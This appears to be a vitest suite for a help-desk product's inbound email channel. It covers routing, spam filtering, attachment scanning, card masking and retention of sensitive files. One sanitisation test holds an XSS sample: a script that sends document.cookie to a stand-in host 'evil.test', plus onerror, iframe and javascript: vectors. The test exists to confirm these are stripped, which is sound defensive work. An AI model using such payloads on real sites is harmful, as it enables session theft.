/**
 * Inbound email → ticket (FR-MOD-08.5.3).
 *
 * Three properties carry this suite, each silent when broken:
 *
 *  - Routing: a message to `<org>@inbound…`, or to a labelled
 *    `<org>+support@inbound…`, becomes a ticket on *that* org's licence and no
 *    other. Proved across the A/B fixtures, not trusted to a WHERE clause.
 *  - No duplicate customer: a sender already known by email is reused. A second
 *    record would split one person's history — and the match must not reach
 *    across tenants, so the same address in another org is a different person.
 *  - Spam: with the workspace filter on (the default), a flagged message makes
 *    no ticket; with it off, the same message does. The negative is written
 *    first, because "always creates a ticket" would pass every positive test.
 */
import { existsSync, mkdtempSync, readdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PrismaClient } from '@prisma/client';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { RetentionRunner } from '../../src/services/retention/retention.js';
import { LocalStore } from '../../src/services/storage/local-store.js';
import { StorageUnavailableError } from '../../src/services/storage/storage-error.js';
import { EICAR_SIGNATURE } from '../../src/services/storage/virus-scanner.js';
import {
  grantToken,
  ownerClient,
  seedDefaultBrand,
  seedFixtures,
  testEnv,
  type Fixtures,
} from '../helpers/fixtures.js';
import { clearRateLimits, startTestServer, type TestServer } from '../helpers/server.js';

const DOMAIN = 'inbound.siyahtus.localhost';

interface InboundResult {
  status: 'created' | 'ignored';
  ticket_id?: string;
  reason?: string;
}

describe('inbound email → ticket', () => {
  let owner: PrismaClient;
  let server: TestServer;
  let fx: Fixtures;

  const addressFor = (organizationId: string) => `${organizationId}@${DOMAIN}`;

  const inbound = (payload: Record<string, unknown>, headers: Record<string, string> = {}) =>
    server.post('/channels/email/inbound', payload, headers);

  beforeAll(async () => {
    owner = ownerClient();
    server = await startTestServer();
  });

  afterAll(async () => {
    await server.close();
    await owner.$disconnect();
  });

  beforeEach(async () => {
    fx = await seedFixtures(owner);
    await clearRateLimits(server.app);
  });

  // --- Routing to the right licence -----------------------------------------

  it('turns a forwarded email into a ticket on the addressed licence', async () => {
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'Jane Buyer <jane@shopper.example>',
      subject: 'Where is my order?',
      text: 'It has been a week.',
    });

    expect(response.statusCode).toBe(200);
    const body: InboundResult = response.json();
    expect(body.status).toBe('created');
    expect(body.ticket_id).toBeTruthy();

    const ticket = await owner.ticket.findUniqueOrThrow({ where: { id: body.ticket_id } });
    expect(ticket.licenseId).toBe(fx.a.licenseId);
    expect(ticket.subject).toBe('Where is my order?');
    expect(ticket.status).toBe('open');
    expect(ticket.customerId).toBeTruthy();

    // The sender became a customer on the addressed organization, carrying the
    // display name through.
    const customer = await owner.customer.findUniqueOrThrow({
      where: { id: ticket.customerId! },
    });
    expect(customer.organizationId).toBe(fx.a.organizationId);
    expect(customer.email).toBe('jane@shopper.example');
    expect(customer.name).toBe('Jane Buyer');
  });

  it('lands the ticket on the addressed licence and nowhere else', async () => {
    await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'someone@shopper.example',
      subject: 'A question',
    });

    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(1);
    expect(await owner.ticket.count({ where: { licenseId: fx.b.licenseId } })).toBe(0);
  });

  it('accepts a bare address and defaults an empty subject', async () => {
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'plain@shopper.example',
      subject: '',
    });

    const ticket = await owner.ticket.findUniqueOrThrow({
      where: { id: response.json().ticket_id },
    });
    expect(ticket.subject).toBe('(no subject)');
    const customer = await owner.customer.findUniqueOrThrow({ where: { id: ticket.customerId! } });
    expect(customer.name).toBeNull();
  });

  // --- No duplicate customer ------------------------------------------------

  it('reuses an existing customer instead of opening a second record', async () => {
    const existing = await owner.customer.create({
      data: {
        organizationId: fx.a.organizationId,
        name: 'Repeat Writer',
        email: 'repeat@shopper.example',
      },
      select: { id: true },
    });

    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      // Different casing than stored: the citext column must still match.
      from: 'REPEAT@Shopper.Example',
      subject: 'Following up',
    });

    const ticket = await owner.ticket.findUniqueOrThrow({
      where: { id: response.json().ticket_id },
    });
    expect(ticket.customerId).toBe(existing.id);
    expect(
      await owner.customer.count({
        where: { organizationId: fx.a.organizationId, email: 'repeat@shopper.example' },
      }),
    ).toBe(1);
  });

  it('keeps one customer across repeat emails from the same sender', async () => {
    const payload = {
      to: addressFor(fx.a.organizationId),
      from: 'loyal@shopper.example',
      subject: 'Again',
    };
    await inbound(payload);
    await inbound({ ...payload, subject: 'And again' });

    expect(
      await owner.customer.count({
        where: { organizationId: fx.a.organizationId, email: 'loyal@shopper.example' },
      }),
    ).toBe(1);
    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(2);
  });

  it('does not match a customer across tenants — same email, different org', async () => {
    // The address exists as a customer in B; a mail to A must not reuse it.
    await owner.customer.create({
      data: { organizationId: fx.b.organizationId, email: 'shared@shopper.example' },
    });

    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'shared@shopper.example',
      subject: 'Hello A',
    });

    const ticket = await owner.ticket.findUniqueOrThrow({
      where: { id: response.json().ticket_id },
    });
    const ticketCustomer = await owner.customer.findUniqueOrThrow({
      where: { id: ticket.customerId! },
    });
    expect(ticketCustomer.organizationId).toBe(fx.a.organizationId);
    // One per organization now, not one shared row.
    expect(await owner.customer.count({ where: { email: 'shared@shopper.example' } })).toBe(2);
  });

  // --- Spam -----------------------------------------------------------------

  it('drops a flagged message when the workspace filter is on (the default)', async () => {
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'spammer@shady.example',
      subject: 'You won',
      spam: true,
    });

    expect(response.statusCode).toBe(200);
    expect(response.json()).toEqual({ status: 'ignored', reason: 'spam' });
    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(0);
    // A dropped message leaves no trace — not even a customer.
    expect(await owner.customer.count({ where: { email: 'spammer@shady.example' } })).toBe(0);
  });

  it('lets a flagged message through when the workspace turned the filter off', async () => {
    const brandId = await seedDefaultBrand(owner, fx.a.licenseId);
    await owner.securitySettings.create({
      data: { licenseId: fx.a.licenseId, brandId, spamFilterEnabled: false },
    });

    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'newsletter@shady.example',
      subject: 'Deals',
      spam: true,
    });

    expect(response.json().status).toBe('created');
    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(1);
  });

  it('creates a ticket for an unflagged message even with the filter on', async () => {
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'genuine@shopper.example',
      subject: 'Real question',
      spam: false,
    });
    expect(response.json().status).toBe('created');
  });

  it('drops a content-spam subject the provider passed, via the shared engine', async () => {
    // The provider's verdict is clean, but the subject itself is a blocklisted
    // spam phrase — the same deterministic classifier the widget uses catches
    // it. This is what "email is on the same engine" (FR-MOD-08.9.3) buys: a
    // channel is not limited to whatever an upstream provider happened to flag.
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'promo@shady.example',
      subject: 'Click here to claim your prize',
      spam: false,
    });

    expect(response.json()).toEqual({ status: 'ignored', reason: 'spam' });
    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(0);
  });

  // --- More than one address ------------------------------------------------

  describe('more than one forwarding address (FR-MOD-08.5.3)', () => {
    it('forwards two of one workspace’s addresses into two tickets, each naming its own', async () => {
      const support = await owner.inboundEmailAddress.create({
        data: {
          licenseId: fx.a.licenseId,
          label: 'support',
          localPart: `${fx.a.organizationId}+support`,
        },
        select: { id: true },
      });
      const billing = await owner.inboundEmailAddress.create({
        data: {
          licenseId: fx.a.licenseId,
          label: 'billing',
          localPart: `${fx.a.organizationId}+billing`,
        },
        select: { id: true },
      });

      const first = await inbound({
        to: `${fx.a.organizationId}+support@${DOMAIN}`,
        from: 'one@shopper.example',
        subject: 'Where is my order?',
      });
      const second = await inbound({
        to: `${fx.a.organizationId}+billing@${DOMAIN}`,
        from: 'two@shopper.example',
        subject: 'Wrong invoice',
      });

      expect(first.json().status).toBe('created');
      expect(second.json().status).toBe('created');
      expect(first.json().ticket_id).not.toBe(second.json().ticket_id);

      const supportTicket = await owner.ticket.findUniqueOrThrow({
        where: { id: first.json().ticket_id },
      });
      const billingTicket = await owner.ticket.findUniqueOrThrow({
        where: { id: second.json().ticket_id },
      });
      expect(supportTicket.inboundAddressId).toBe(support.id);
      expect(billingTicket.inboundAddressId).toBe(billing.id);
    });

    it('still accepts the address every workspace has always had, and records it', async () => {
      const response = await inbound({
        to: addressFor(fx.a.organizationId),
        from: 'legacy@shopper.example',
        subject: 'Same as ever',
      });

      expect(response.json().status).toBe('created');
      const ticket = await owner.ticket.findUniqueOrThrow({
        where: { id: response.json().ticket_id },
      });
      // The default address materialises its row on first use, so even a
      // workspace that predates the table gets its mail attributed.
      const defaultAddress = await owner.inboundEmailAddress.findFirstOrThrow({
        where: { licenseId: fx.a.licenseId, label: null },
      });
      expect(ticket.inboundAddressId).toBe(defaultAddress.id);
      expect(defaultAddress.localPart).toBe(fx.a.organizationId);
    });

    it('does not deliver one workspace’s labelled address into another’s tickets', async () => {
      // B defines `support`; a message to *A's* support address must not reach it.
      await owner.inboundEmailAddress.create({
        data: {
          licenseId: fx.b.licenseId,
          label: 'support',
          localPart: `${fx.b.organizationId}+support`,
        },
      });

      const response = await inbound({
        to: `${fx.b.organizationId}+support@${DOMAIN}`,
        from: 'writer@shopper.example',
        subject: 'For B only',
      });

      expect(response.json().status).toBe('created');
      expect(await owner.ticket.count({ where: { licenseId: fx.b.licenseId } })).toBe(1);
      expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(0);
    });

    it('refuses a label nobody defined — an address that was never opened accepts nothing', async () => {
      const response = await inbound({
        to: `${fx.a.organizationId}+nobody@${DOMAIN}`,
        from: 'someone@shopper.example',
        subject: 'Anyone home?',
      });

      expect(response.statusCode).toBe(404);
      expect(await owner.ticket.count()).toBe(0);
    });

    it('does not let a bare `+` collapse into the default address', async () => {
      const response = await inbound({
        to: `${fx.a.organizationId}+@${DOMAIN}`,
        from: 'someone@shopper.example',
        subject: 'Hi',
      });

      expect(response.statusCode).toBe(404);
      expect(await owner.ticket.count()).toBe(0);
    });
  });

  // --- Unroutable -----------------------------------------------------------

  it('rejects an address whose organization does not exist', async () => {
    const response = await inbound({
      to: `1e5b8c94-0000-4000-8000-000000000000@${DOMAIN}`,
      from: 'someone@shopper.example',
      subject: 'Anyone home?',
    });
    expect(response.statusCode).toBe(404);
    expect(await owner.ticket.count()).toBe(0);
  });

  it('rejects an address whose local part is not an organization id', async () => {
    const response = await inbound({
      to: `support@${DOMAIN}`,
      from: 'someone@shopper.example',
      subject: 'Hi',
    });
    expect(response.statusCode).toBe(404);
    expect(await owner.ticket.count()).toBe(0);
  });

  it('rejects a message with no usable sender address', async () => {
    const response = await inbound({
      to: addressFor(fx.a.organizationId),
      from: 'not an email',
      subject: 'Hi',
    });
    expect(response.statusCode).toBe(400);
    expect(await owner.ticket.count()).toBe(0);
  });
});

// --- Optional edge auth ------------------------------------------------------

describe('inbound email webhook secret', () => {
  let owner: PrismaClient;
  let server: TestServer;
  let fx: Fixtures;

  beforeAll(async () => {
    owner = ownerClient();
    server = await startTestServer({ INBOUND_EMAIL_SECRET: 'a-shared-inbound-secret' });
  });

  afterAll(async () => {
    await server.close();
    await owner.$disconnect();
  });

  beforeEach(async () => {
    fx = await seedFixtures(owner);
    await clearRateLimits(server.app);
  });

  const message = () => ({
    to: `${fx.a.organizationId}@${DOMAIN}`,
    from: 'sender@shopper.example',
    subject: 'Hello',
  });

  it('refuses a request without the configured secret', async () => {
    const response = await server.post('/channels/email/inbound', message());
    expect(response.statusCode).toBe(401);
    expect(await owner.ticket.count()).toBe(0);
  });

  it('refuses a request with the wrong secret', async () => {
    const response = await server.post('/channels/email/inbound', message(), {
      'x-inbound-secret': 'wrong',
    });
    expect(response.statusCode).toBe(401);
  });

  it('accepts a request carrying the right secret', async () => {
    const response = await server.post('/channels/email/inbound', message(), {
      'x-inbound-secret': 'a-shared-inbound-secret',
    });
    expect(response.statusCode).toBe(200);
    expect(response.json().status).toBe('created');
  });
});

// --- The mail itself: text, HTML, files (tm 357 · SiyahTuş analysis HD-02) ------
//
// Until tm 357 the webhook accepted a body and threw it away. These pin what a
// player's mail now leaves behind: the reply as the ticket's first message,
// quote and signature cut but kept, the files checked, scanned and stored
// behind the ticket's own door, a sensitive one locked for a role without the
// permission and audited for one with it, one ticket per Message-ID, and the
// retention window reaching a sensitive file.

const PDF = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n');
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]);
const REPLY = 'Yatırımım geçmedi, 2.500 TL, saat 14:42, dekont ektedir.';
const GMAIL_TR = [
  REPLY,
  '',
  '20 Eki 2026 Pzt, 14:50 tarihinde SiyahTuş Destek <destek@ornek.test> şunu yazdı:',
  '> Merhaba, yatırımınızın dekontunu iletir misiniz?',
  '>',
  '> Saygılarımızla',
].join('\n');

interface ThreadMessage {
  id: string;
  ticket_id: string;
  kind: string;
  author_type: string;
  body_text: string;
  body_text_full: string | null;
  body_html: string | null;
  attachments: Array<{
    key: string;
    name: string;
    size: number;
    mime: string;
    scan_status: string;
    sensitive: boolean;
    purged?: boolean;
    locked?: boolean;
  }>;
}

const attach = (filename: string, bytes: Buffer, contentType = 'application/octet-stream') => ({
  filename,
  content_type: contentType,
  content_base64: bytes.toString('base64'),
});

describe('inbound email body and files (tm 357)', () => {
  let owner: PrismaClient;
  let server: TestServer;
  let fx: Fixtures;
  let storageDir: string;
  let ownerToken: string;
  let agentToken: string;
  let otherTenantToken: string;
  let seq = 0;

  const auth = (token: string) => ({ authorization: `Bearer ${token}` });
  const address = () => `${fx.a.organizationId}@${DOMAIN}`;
  const nextMessageId = () => `<m${Date.now()}.${++seq}@mail.oyuncu.test>`;

  const inbound = (payload: Record<string, unknown>) =>
    server.post('/channels/email/inbound', {
      to: address(),
      from: 'Ali Veli <ali@oyuncu.test>',
      subject: 'Yatırımım geçmedi',
      ...payload,
    });

  async function created(payload: Record<string, unknown>): Promise<string> {
    const response = await inbound(payload);
    expect(response.statusCode, response.body).toBe(200);
    const body = response.json() as { status: string; ticket_id: string };
    expect(body.status).toBe('created');
    return body.ticket_id;
  }

  async function thread(ticketId: string, token = ownerToken): Promise<ThreadMessage[]> {
    const response = await server.get(`/tickets/${ticketId}/messages`, auth(token));
    expect(response.statusCode, response.body).toBe(200);
    return (response.json() as { items: ThreadMessage[] }).items;
  }

  const download = (message: ThreadMessage, key: string, token = ownerToken) =>
    server.get(
      `/tickets/${message.ticket_id}/messages/${message.id}/attachments/${key}`,
      auth(token),
    );

  /** Every stored file of licence A, sidecars aside. */
  function storedFiles(): string[] {
    const dir = join(storageDir, String(fx.a.licenseId));
    return existsSync(dir) ? readdirSync(dir).filter((name) => !name.endsWith('.type')) : [];
  }

  beforeAll(async () => {
    owner = ownerClient();
    storageDir = mkdtempSync(join(tmpdir(), 'siyahtus-inbound-email-'));
    server = await startTestServer({ STORAGE_PROVIDER: 'local', STORAGE_LOCAL_DIR: storageDir });
  });

  afterAll(async () => {
    await server.close();
    await owner.$disconnect();
    rmSync(storageDir, { recursive: true, force: true });
  });

  beforeEach(async () => {
    fx = await seedFixtures(owner);
    await clearRateLimits(server.app);
    rmSync(join(storageDir, String(fx.a.licenseId)), { recursive: true, force: true });
    ownerToken = await grantToken(owner, {
      licenseId: fx.a.licenseId,
      organizationId: fx.a.organizationId,
      ownerId: fx.a.ownerAccountId,
      scopes: ['tickets--all:rw', 'tickets--all:ro', 'access_rules:rw', 'access_rules:ro'],
    });
    agentToken = await grantToken(owner, {
      licenseId: fx.a.licenseId,
      organizationId: fx.a.organizationId,
      ownerId: fx.a.agentAccountId,
      scopes: ['tickets--access:rw', 'tickets--access:ro'],
    });
    otherTenantToken = await grantToken(owner, {
      licenseId: fx.b.licenseId,
      organizationId: fx.b.organizationId,
      ownerId: fx.b.ownerAccountId,
      scopes: ['tickets--all:rw', 'tickets--all:ro'],
    });
  });

  it("keeps the player's mail as the ticket's first message, quote cut, with its dekont (FR-MOD-08.5.3)", async () => {
    const ticketId = await created({
      text: GMAIL_TR,
      message_id: '<CAF1abc@mail.gmail.com>',
      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
    });

    const [message, ...rest] = await thread(ticketId);
    expect(rest).toEqual([]);
    expect(message).toMatchObject({
      kind: 'customer_message',
      author_type: 'customer',
      body_text: REPLY,
    });
    // The cut is a guess, so the whole mail is kept beside it.
    expect(message!.body_text_full).toContain('şunu yazdı:');
    expect(message!.body_text_full).toContain('> Merhaba, yatırımınızın dekontunu');
    expect(message!.attachments).toEqual([
      {
        key: expect.stringMatching(new RegExp(`^${fx.a.licenseId}-m-`)),
        name: 'dekont.pdf',
        size: PDF.length,
        mime: 'application/pdf',
        scan_status: 'clean',
        sensitive: false,
      },
    ]);

    const row = await owner.ticketMessage.findUniqueOrThrow({ where: { id: message!.id } });
    expect(row.emailMessageId).toBe('CAF1abc@mail.gmail.com');
    expect(row.licenseId).toBe(fx.a.licenseId);
    const ticket = await owner.ticket.findUniqueOrThrow({ where: { id: ticketId } });
    expect(ticket.lastCustomerMessageAt).not.toBeNull();

    // The bytes open through the ticket — and only there.
    const key = message!.attachments[0]!.key;
    const file = await download(message!, key);
    expect(file.statusCode).toBe(200);
    expect(file.rawPayload.equals(PDF)).toBe(true);
    expect(file.headers['content-type']).toBe('application/pdf');
    expect(file.headers['content-disposition']).toBe('attachment');
    expect(file.headers['x-content-type-options']).toBe('nosniff');
    // A session that may read uploads still cannot read this one through them.
    const uploadsToken = await grantToken(owner, {
      licenseId: fx.a.licenseId,
      organizationId: fx.a.organizationId,
      ownerId: fx.a.ownerAccountId,
      scopes: ['chats--all:ro', 'chats--all:rw'],
    });
    expect((await server.get(`/uploads/${key}`, auth(uploadsToken))).statusCode).toBe(404);
    // Another workspace learns nothing, a key on another message nothing either.
    expect((await download(message!, key, otherTenantToken)).statusCode).toBe(404);
    expect(
      (
        await server.get(
          `/tickets/${ticketId}/messages/${message!.id}/attachments/${fx.a.licenseId}-m-00000000-0000-4000-8000-000000000000.pdf`,
          auth(ownerToken),
        )
      ).statusCode,
    ).toBe(404);
  });

  it('refuses the EICAR file without refusing the mail, and says so on the ticket (FR-MOD-08.9.4)', async () => {
    const eicar = Buffer.concat([PDF, Buffer.from(EICAR_SIGNATURE, 'latin1')]);
    const ticketId = await created({
      text: REPLY,
      attachments: [
        attach('virus.pdf', eicar, 'application/pdf'),
        attach('ekran.png', PNG, 'image/png'),
        attach('kurulum.exe', Buffer.from('MZ\x90\x00'), 'application/x-msdownload'),
      ],
    });

    const [message, note, ...rest] = await thread(ticketId);
    expect(rest).toEqual([]);
    expect(message!.attachments.map((file) => file.name)).toEqual(['ekran.png']);
    expect(note).toMatchObject({ kind: 'system', author_type: 'system' });
    expect(note!.body_text).toContain('“virus.pdf” — it did not pass the virus scan');
    expect(note!.body_text).toContain('“kurulum.exe” — only images and PDF files are kept');
    // Not one byte of the infected file is in the store.
    expect(storedFiles()).toEqual([message!.attachments[0]!.key]);
  });

  it('opens one ticket for one Message-ID, however often and however concurrently it arrives (FR-MOD-08.5.3)', async () => {
    const messageId = nextMessageId();
    const first = await created({ text: REPLY, message_id: messageId });

    const again = await inbound({ text: REPLY, message_id: messageId });
    expect(again.json()).toEqual({ status: 'created', ticket_id: first, duplicate: true });

    // Two deliveries racing in, each with a file: one ticket, one message, one
    // stored file — the loser's file is deleted again.
    const racing = nextMessageId();
    const payload = {
      text: REPLY,
      message_id: racing,
      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
    };
    const [a, b] = await Promise.all([inbound(payload), inbound(payload)]);
    expect([a.statusCode, b.statusCode]).toEqual([200, 200]);
    const ids = [a.json().ticket_id, b.json().ticket_id];
    expect(ids[0]).toBe(ids[1]);
    expect([a.json().duplicate, b.json().duplicate].filter(Boolean)).toHaveLength(1);

    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(2);
    expect(
      await owner.ticketMessage.count({
        where: { licenseId: fx.a.licenseId, kind: 'customer_message' },
      }),
    ).toBe(2);
    expect(storedFiles()).toHaveLength(1);
  });

  it('keeps the HTML only sanitised, and reads the text from it when the mail has none', async () => {
    const ticketId = await created({
      html:
        '<div>Dekont ektedir.<script>fetch("https://evil.test/?c="+document.cookie)</script></div>' +
        '<img src="https://tracker.test/open.gif" onerror="alert(1)">' +
        '<iframe src="https://evil.test"></iframe><a href="javascript:alert(1)">tıkla</a>',
    });

    const [message] = await thread(ticketId);
    expect(message!.body_text).toBe('Dekont ektedir.\ntıkla');
    expect(message!.body_html).toBe(
      '<div>Dekont ektedir.</div><img data-src="https://tracker.test/open.gif"><a>tıkla</a>',
    );
    expect(message!.body_html).not.toMatch(/script|onerror|iframe|javascript:/i);
  });

  it("masks a card number in the text, the whole text and the HTML, and leaves the signature's phone (FR-MOD-08.9.5)", async () => {
    const ticketId = await created({
      text: 'Kartım 4111 1111 1111 1111 ile yatırdım.\n\n-- \nAli Veli\nTel: 0532 123 45 67',
      html: '<p>Kartım 4111 1111 1111 1111 ile yatırdım.</p>',
    });

    const [message] = await thread(ticketId);
    const all = [message!.body_text, message!.body_text_full ?? '', message!.body_html ?? ''];
    for (const text of all) {
      expect(text).not.toContain('4111 1111 1111 1111');
      expect(text).toContain('**** **** **** 1111');
    }
    expect(message!.body_text).not.toContain('0532');
    expect(message!.body_text_full).toContain('Tel: 0532 123 45 67');
  });

  it('drops a mail whose text is spam before any file is stored (FR-MOD-08.9.3)', async () => {
    const response = await inbound({
      subject: 'Merhaba',
      text: 'Click here to claim your prize',
      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
    });
    expect(response.json()).toEqual({ status: 'ignored', reason: 'spam' });
    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(0);
    expect(storedFiles()).toEqual([]);
  });

  it('locks an identity document for a role without the permission, and audits every opening', async () => {
    const ticketId = await created({
      text: REPLY,
      attachments: [
        attach('KİMLİK_ön.jpg', JPEG, 'image/jpeg'),
        attach('dekont.pdf', PDF, 'application/pdf'),
      ],
    });
    // An agent the ticket is assigned to reads its thread.
    await owner.ticket.update({
      where: { id: ticketId },
      data: { assigneeId: fx.a.agentAccountId },
    });
    const opened = () =>
      owner.auditLogEntry.findMany({
        where: { licenseId: fx.a.licenseId, action: 'ticket.attachment_opened' },
      });

    // The agent's role does not hold `customers.documents.view` by default.
    const [asAgent] = await thread(ticketId, agentToken);
    const [idCard, receipt] = asAgent!.attachments;
    expect(idCard).toMatchObject({ name: 'KİMLİK_ön.jpg', sensitive: true, locked: true });
    expect(receipt).toMatchObject({ name: 'dekont.pdf', sensitive: false });
    expect(receipt!.locked).toBeUndefined();

    const refused = await download(asAgent!, idCard!.key, agentToken);
    expect(refused.statusCode).toBe(403);
    expect(refused.json().error.details).toMatchObject({
      reason: 'capability_required',
      capability: 'customers.documents.view',
    });
    expect((await download(asAgent!, receipt!.key, agentToken)).statusCode).toBe(200);
    // An ordinary file is not an event.
    expect(await opened()).toEqual([]);

    // The owner's role holds it: unlocked, served uncached, and recorded.
    const [asOwner] = await thread(ticketId);
    expect(asOwner!.attachments[0]!.locked).toBeUndefined();
    const file = await download(asOwner!, idCard!.key);
    expect(file.statusCode).toBe(200);
    expect(file.rawPayload.equals(JPEG)).toBe(true);
    expect(file.headers['cache-control']).toBe('no-store');

    const entries = await opened();
    expect(entries).toHaveLength(1);
    expect(entries[0]).toMatchObject({
      actorId: fx.a.ownerAccountId,
      target: `ticket:${ticketId}`,
      metadata: { message_id: asOwner!.id, key: idCard!.key },
    });
    // The name can itself be personal data; it is not in the trail.
    expect(JSON.stringify(entries[0]!.metadata)).not.toContain('KİMLİK');
  });

  it('treats every e-mailed file as sensitive when the workspace says so', async () => {
    // `security_settings` is kept per brand; the fixtures start with none.
    await seedDefaultBrand(owner, fx.a.licenseId);
    const saved = await server.patch(
      '/settings/security',
      { inbound_attachments_sensitive: true },
      auth(ownerToken),
    );
    expect(saved.statusCode, saved.body).toBe(200);
    expect(saved.json().inbound_attachments_sensitive).toBe(true);

    const ticketId = await created({
      text: REPLY,
      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
    });
    const [message] = await thread(ticketId);
    expect(message!.attachments[0]).toMatchObject({ name: 'dekont.pdf', sensitive: true });

    // And by the subject alone, with the setting off again.
    await server.patch(
      '/settings/security',
      { inbound_attachments_sensitive: false },
      auth(ownerToken),
    );
    const kyc = await created({
      subject: 'KYC belgelerim',
      attachments: [attach('foto.png', PNG, 'image/png')],
    });
    expect((await thread(kyc))[0]!.attachments[0]!.sensitive).toBe(true);
  });

  it('deletes a sensitive file under the conversation window and marks it purged, keeping the rest', async () => {
    const appRole = new PrismaClient({ datasourceUrl: process.env['DATABASE_APP_URL'] });
    try {
      // Old: a passport (sensitive by its name) beside a dekont (not sensitive).
      const ticketId = await created({
        text: REPLY,
        attachments: [
          attach('pasaport.jpg', JPEG, 'image/jpeg'),
          attach('dekont.pdf', PDF, 'application/pdf'),
        ],
      });
      const fresh = await created({
        text: REPLY,
        attachments: [attach('ehliyet.png', PNG, 'image/png')],
      });
      const [old] = await thread(ticketId);
      const [recent] = await thread(fresh);
      // The old one is past the 365-day thread window; the recent one is not.
      await owner.$executeRaw`
        UPDATE ticket_messages SET created_at = now() - interval '400 days' WHERE id = ${old!.id}::uuid`;

      const runner = new RetentionRunner(appRole, {
        policy: { threadDays: 365, visitDays: 90, mailDays: 30, auditDays: 30 },
        mailDir: join(storageDir, 'no-mail'),
        auditChainSecret: testEnv().AUDIT_CHAIN_SECRET,
        store: new LocalStore(storageDir),
      });

      const preview = await runner.run({ dryRun: true });
      expect(
        preview.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
      ).toBe(1);
      expect(storedFiles()).toHaveLength(3);

      const report = await runner.run({ dryRun: false });
      const mine = report.tenants.find((t) => t.licenseId === String(fx.a.licenseId));
      expect(mine?.sensitiveFiles).toBe(1);
      // Only the old sensitive file went: the old dekont and the recent licence stay.
      const [passport, receipt] = old!.attachments;
      expect(storedFiles().sort()).toEqual([receipt!.key, recent!.attachments[0]!.key].sort());

      // The message stays and says the file was there; the door is shut.
      const [after] = await thread(ticketId);
      expect(after!.body_text).toBe(REPLY);
      expect(after!.attachments[0]).toMatchObject({ name: 'pasaport.jpg', purged: true });
      expect(after!.attachments[1]).toMatchObject({ name: 'dekont.pdf', sensitive: false });
      expect(after!.attachments[1]!.purged).toBeUndefined();
      expect((await download(after!, passport!.key)).statusCode).toBe(404);
      expect((await download(after!, receipt!.key)).statusCode).toBe(200);
      expect((await thread(fresh))[0]!.attachments[0]!.purged).toBeUndefined();

      // Nothing left to do: a second run removes nothing.
      const twice = await runner.run({ dryRun: false });
      expect(
        twice.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
      ).toBe(0);
    } finally {
      await appRole.$disconnect();
    }
  });

  it('lets a store outage stop the file step, not the sweep — and marks nothing it did not delete', async () => {
    const appRole = new PrismaClient({ datasourceUrl: process.env['DATABASE_APP_URL'] });
    try {
      const ticketId = await created({
        text: REPLY,
        attachments: [attach('kimlik.jpg', JPEG, 'image/jpeg')],
      });
      const [message] = await thread(ticketId);
      await owner.$executeRaw`
        UPDATE ticket_messages SET created_at = now() - interval '400 days' WHERE id = ${message!.id}::uuid`;

      const local = new LocalStore(storageDir);
      const runner = new RetentionRunner(appRole, {
        policy: { threadDays: 365, visitDays: 90, mailDays: 30, auditDays: 30 },
        mailDir: join(storageDir, 'no-mail'),
        auditChainSecret: testEnv().AUDIT_CHAIN_SECRET,
        store: {
          put: (key, bytes, type) => local.put(key, bytes, type),
          get: (key) => local.get(key),
          exists: (key) => local.exists(key),
          stat: (key) => local.stat(key),
          delete: () => Promise.reject(new StorageUnavailableError('bucket down')),
          listKnowledge: (license) => local.listKnowledge(license),
        },
      });

      const report = await runner.run({ dryRun: false });
      expect(
        report.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
      ).toBe(0);
      expect(storedFiles()).toEqual([message!.attachments[0]!.key]);
      expect((await thread(ticketId))[0]!.attachments[0]!.purged).toBeUndefined();
    } finally {
      await appRole.$disconnect();
    }
  });
});
